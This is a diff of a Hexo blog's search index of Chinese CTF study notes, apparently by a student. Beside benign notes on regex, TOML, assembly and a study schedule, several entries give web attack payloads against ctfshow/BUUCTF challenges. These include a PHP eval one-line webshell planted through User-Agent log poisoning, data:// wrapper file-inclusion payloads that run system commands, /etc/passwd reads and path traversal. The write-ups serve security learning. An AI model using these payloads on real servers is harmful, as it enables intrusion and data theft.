-    <content><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
-
-<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-<p>先调出文件:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
-
-<p>然后再查看日志文件:<br>写入payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
-<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
-<p>才可以利用repeater回显:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
-
-<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
+    <title>命令执行:使用文件包含绕过</title>
+    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
+<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
 ]]></content>
       <categories>
         <category>ctfshow web</category>
       </categories>
       <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代码审计套路</title>
-    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
-    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
-<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
-<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
+        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -2342,65 +2519,6 @@ class ContextAwareClassifier:
       </categories>
       <tags>
         <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>toml配置文件</title>
-    <url>/2025/01/26/toml%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="toml配置文件"><a href="#toml配置文件" class="headerlink" title="toml配置文件"></a>toml配置文件</h1><h2 id="有关输出的简单例子"><a href="#有关输出的简单例子" class="headerlink" title="有关输出的简单例子:"></a>有关输出的简单例子:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_toml</span>() -&gt; <span class="built_in">dict</span>: </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        toml_data: <span class="built_in">dict</span> = tomllib.load(f)</span><br><span class="line">    <span class="keyword">return</span> toml_data</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data: <span class="built_in">dict</span> = load_toml()</span><br><span class="line">    pprint(data, sort_dicts=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#解析toml文件并且返回一个字典</span></span><br><span class="line"><span class="comment">#打开toml文件,以只读模式,文件对象赋值给变量f</span></span><br><span class="line"><span class="comment">#箭头和冒号都是注解罢了,不会影响实际函数的运行,只是为了让代码更加易读</span></span><br><span class="line"><span class="comment">#调用tomllib.load()函数,传入文件对象f,解析toml文件,并返回一个字典</span></span><br></pre></td></tr></table></figure>
-
-<p>在该main.py目录下还有另外一个config.toml配置文件,</p>
-<h3 id="函数代码块"><a href="#函数代码块" class="headerlink" title="函数代码块:"></a>函数代码块:</h3><p><code>def load_toml() -&gt; dict:</code>这里是使用箭头进行注释,表明这个函数的返回值是字典,因为,在tomllib库里面,tomllib.load()这个函数对二进制文件进行处理后就是以字典的形式返回的,所以我们要进行注释,解释这个函数的返回值是字典<br><code>toml_data: dict = tomllib.load(f)</code>并且在这个地方,就是给变量赋值的地方,也把这个变量标注为字典</p>
-<h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>经过及其简单的启动程序:</p>
-<p><code>if __name__ == &#39;__main__&#39;:</code></p>
-<p>代表程序启动,启动之后就会使用函数,对这个<code>config.toml</code>配置文件进行读取并且以<code>pprint</code>这样美观的方式将其输出。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>toml配置文件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行:使用文件包含绕过</title>
-    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
-<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h4><p>使用文件包含解决命令执行题目,通法就是先将include函数包含一个参数传递给要被正则表达式检查的变量,然后再在后半部分,再包含php伪协议给前面部分的include函数读取,达到绕过preg_match并且执行命令的目的.</p>
-]]></content>
-      <categories>
-        <category>ctfshow web</category>
-      </categories>
-      <tags>
-        <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>数据库基本概念</title>
-    <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>日程表</title>
-    <url>/2025/01/16/%E6%97%A5%E7%A8%8B%E8%A1%A8/</url>
-    <content><![CDATA[<h2 id="大一寒假安排"><a href="#大一寒假安排" class="headerlink" title="大一寒假安排"></a>大一寒假安排</h2><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><h4 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h4><p>春秋杯</p>
-<h4 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h4><p>西湖论剑杯</p>
-<h3 id="日常安排"><a href="#日常安排" class="headerlink" title="日常安排"></a>日常安排</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>1.6:30起床，8:00开始学习C,先进行计算机二级常识基础的记忆。就半个小时</p>
-<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><p>1.学到12:00停手,一直到13:30都是休息时间</p>
-<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>1.java 2h<br>2.python 2h<br>3.mysql和php交互环境的配置(25.1.17)<br>4.做ctfshow和春秋杯的题,晚上听讲解<br>5.另外就是挑战杯:<br>先看材料,有什么要求,再联系老师交流我想制作一个网页安全的系统,可以怎么入手,<br>这样既把项目做了,又可以学习ctf知识。</p>
-<p>另外别忘了干洗。</p>
-<h3 id="挑战杯项目"><a href="#挑战杯项目" class="headerlink" title="挑战杯项目"></a>挑战杯项目</h3><h4 id="项目简述"><a href="#项目简述" class="headerlink" title="项目简述"></a>项目简述</h4><p>1.大概思路:用mistral作为基本模型,然后使用网安数据集进行训练,制作一个网安大模型,然后写一个网页推理对话程序,在这个LLM里配置RAG,RAG内内使用我自行编撰的网络安全知识库。<br>最后的理想呈现效果就是:可以利用这个网页ai(类似于chatgpt),搞漏洞poc,询问它如何sql注入。</p>
-<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>1.首先对ai编程的基本逻辑不清楚,LLM,rag等基础概念需要深入了解<br>2.unsloth训练需要学习,以及我们项目的mistral模型,了解什么是模型,人工智能的基本运行逻辑是什么,师傅建议直接使用google colab上面的笔记本,不需要过多配置。<br>3.几个专业术语了解:ollama(管理我创建的模型) gguf(正常模型的量化格式) faiss()<br>4.VPN代理的部署,并非难点,只是需要去落实<br>5.以及chatgpt 4o的使用</p>
-]]></content>
-      <categories>
-        <category>个人安排</category>
-      </categories>
-      <tags>
-        <tag>大一寒假安排</tag>
       </tags>
   </entry>
   <entry>
@@ -2458,27 +2576,28 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>正则匹配注意点个人笔记</title>
-    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里只匹配mat<br>但是:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
-<p>这里就会把fat,sat,mat都给匹配上</p>
-<p><strong>总结:</strong></p>
-<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>正则匹配</tag>
-      </tags>
+    <title>数据库基本概念</title>
+    <url>/2025/01/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>爬虫，寻找数据集入门</title>
-    <url>/2025/03/10/%E7%88%AC%E8%99%AB%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%95%B0%E6%8D%AE%E9%9B%86%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[]]></content>
+    <title>日程表</title>
+    <url>/2025/01/16/%E6%97%A5%E7%A8%8B%E8%A1%A8/</url>
+    <content><![CDATA[<h2 id="大一寒假安排"><a href="#大一寒假安排" class="headerlink" title="大一寒假安排"></a>大一寒假安排</h2><h3 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h3><h4 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h4><p>春秋杯</p>
+<h4 id="1-18"><a href="#1-18" class="headerlink" title="1.18"></a>1.18</h4><p>西湖论剑杯</p>
+<h3 id="日常安排"><a href="#日常安排" class="headerlink" title="日常安排"></a>日常安排</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>1.6:30起床，8:00开始学习C,先进行计算机二级常识基础的记忆。就半个小时</p>
+<h4 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h4><p>1.学到12:00停手,一直到13:30都是休息时间</p>
+<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>1.java 2h<br>2.python 2h<br>3.mysql和php交互环境的配置(25.1.17)<br>4.做ctfshow和春秋杯的题,晚上听讲解<br>5.另外就是挑战杯:<br>先看材料,有什么要求,再联系老师交流我想制作一个网页安全的系统,可以怎么入手,<br>这样既把项目做了,又可以学习ctf知识。</p>
+<p>另外别忘了干洗。</p>
+<h3 id="挑战杯项目"><a href="#挑战杯项目" class="headerlink" title="挑战杯项目"></a>挑战杯项目</h3><h4 id="项目简述"><a href="#项目简述" class="headerlink" title="项目简述"></a>项目简述</h4><p>1.大概思路:用mistral作为基本模型,然后使用网安数据集进行训练,制作一个网安大模型,然后写一个网页推理对话程序,在这个LLM里配置RAG,RAG内内使用我自行编撰的网络安全知识库。<br>最后的理想呈现效果就是:可以利用这个网页ai(类似于chatgpt),搞漏洞poc,询问它如何sql注入。</p>
+<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><p>1.首先对ai编程的基本逻辑不清楚,LLM,rag等基础概念需要深入了解<br>2.unsloth训练需要学习,以及我们项目的mistral模型,了解什么是模型,人工智能的基本运行逻辑是什么,师傅建议直接使用google colab上面的笔记本,不需要过多配置。<br>3.几个专业术语了解:ollama(管理我创建的模型) gguf(正常模型的量化格式) faiss()<br>4.VPN代理的部署,并非难点,只是需要去落实<br>5.以及chatgpt 4o的使用</p>
+]]></content>
+      <categories>
+        <category>个人安排</category>
+      </categories>
+      <tags>
+        <tag>大一寒假安排</tag>
+      </tags>
   </entry>
   <entry>
     <title>朴素贝叶斯分类算法</title>
@@ -2611,109 +2730,98 @@ class ContextAwareClassifier:
       </tags>
   </entry>
   <entry>
-    <title>机器学习bug收集</title>
-    <url>/2025/03/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0bug%E6%94%B6%E9%9B%86/</url>
-    <content><![CDATA[]]></content>
+    <title>正则匹配注意点个人笔记</title>
+    <url>/2025/01/14/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%B3%A8%E6%84%8F%E7%82%B9%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="正则匹配个人易忽略点记录"><a href="#正则匹配个人易忽略点记录" class="headerlink" title="正则匹配个人易忽略点记录"></a>正则匹配个人易忽略点记录</h3><h4 id="标志-模式修正符"><a href="#标志-模式修正符" class="headerlink" title="标志&#x2F;模式修正符"></a>标志&#x2F;模式修正符</h4><h5 id="1-多行修饰符-Multline"><a href="#1-多行修饰符-Multline" class="headerlink" title="1.多行修饰符(Multline)"></a>1.多行修饰符(Multline)</h5><p>与($,^)这两个检查首尾的符号紧密相关,注意点:在默认情况下,它们是默认检查全局，即所有字符的开头和结尾,即使你使用了换行符号,它也不会对首位进行检查。<br>例如表达式: &#x2F;.at(.)?$&#x2F;gm 表示小写字符a后跟小写字符t,末尾可选除换行符外任意字符</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/&quot; =&gt; The fat</span><br><span class="line">                cat sat</span><br><span class="line">                on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里只匹配mat<br>但是:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/.at(.)?$/gm&quot; =&gt; The fat</span><br><span class="line">                  cat sat</span><br><span class="line">                  on the mat.</span><br></pre></td></tr></table></figure>
+<p>这里就会把fat,sat,mat都给匹配上</p>
+<p><strong>总结:</strong></p>
+<p>重点就是:m加上后会在每排匹配,没有m只会在全局看尾巴或者开头有没有目标字符。</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>正则匹配</tag>
+      </tags>
   </entry>
   <entry>
-    <title>transformer微调预训练模型</title>
-    <url>/2025/03/03/transformer%E5%BE%AE%E8%B0%83%E9%A2%84%E8%AE%AD%E7%BB%83%E6%A8%A1%E5%9E%8B/</url>
-    <content><![CDATA[<h1 id="transformer微调预训练模型"><a href="#transformer微调预训练模型" class="headerlink" title="transformer微调预训练模型"></a>transformer微调预训练模型</h1><p>先写到前面:</p>
-<ul>
-<li>本文只是对网上transformer学习的文档的注解,并非完整教程</li>
-<li>相关文档链接:<a href="https://transformers.run/">transformer快速入门教程</a></li>
+    <title>汇编硬件基础</title>
+    <url>/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="三线概念"><a href="#三线概念" class="headerlink" title="三线概念"></a>三线概念</h1><h2 id="名词辨析"><a href="#名词辨析" class="headerlink" title="名词辨析"></a>名词辨析</h2><ul>
+<li><strong>地址</strong>总线的宽度:</li>
+<li><ul>
+<li><strong>原理</strong>：地址总线宽度决定 CPU 的寻址能力，寻址能力的计算公式为 (2^n) （n 为地址总线宽度），单位是字节（Byte）。8bit &#x3D; 1Byte。</li>
 </ul>
-<h2 id="1-加载数据集"><a href="#1-加载数据集" class="headerlink" title="1. 加载数据集"></a>1. 加载数据集</h2><ul>
-<li>这里我主要是想要搞清楚魔术方法的问题:</li>
+</li>
+<li>储存单元:</li>
+<li><ul>
+<li>**原理：**单位为Byte,存储单元从0开始，n-1结束</li>
+<li><img src="/2025/03/17/%E6%B1%87%E7%BC%96%E7%A1%AC%E4%BB%B6%E5%9F%BA%E7%A1%80/image-20250317185253083.png" class="" title="image-20250317185253083"></li>
 </ul>
-<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念:"></a>基本概念:</h3><ul>
-<li>定义:在 Python 中，以双下划线开头和结尾的方法（例如 <code>__xxx__</code>）被称为特殊方法（也称为魔术方法或 dunder 方法，“dunder” 是 “double underscore” 的缩写）。</li>
-<li><strong>Python 解释器自动调用(特殊性质)</strong>：特殊方法会在特定的操作或事件发生时被 Python 解释器自动调用，而不需要显式地调用这些方法。例如，当使用 <code>len()</code> 函数时，Python 解释器会自动调用对象的 <code>__len__</code> 方法；当使用索引访问对象（如 <code>obj[index]</code>）时，会自动调用对象的 <code>__getitem__</code> 方法。</li>
+</li>
+<li><strong>数据</strong>总线宽度:</li>
+<li><ul>
